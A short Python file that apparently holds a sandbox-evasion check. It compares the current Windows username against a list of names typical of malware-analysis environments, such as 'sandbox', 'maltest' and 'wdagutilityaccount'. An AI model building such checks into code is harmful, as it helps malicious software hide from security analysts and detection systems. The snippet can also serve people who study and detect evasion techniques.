import os

def CheckForBlacklistedNames():
    blacklisted_names = ["johnson", "miller", "malware", "maltest", "currentuser", "sandbox", "virus", "john doe", "test user", "sand box", "wdagutilityaccount"]
    current_username = os.getenv("USERNAME", "").lower()
    
    if current_username in blacklisted_names:
        return True
    else:
        return False
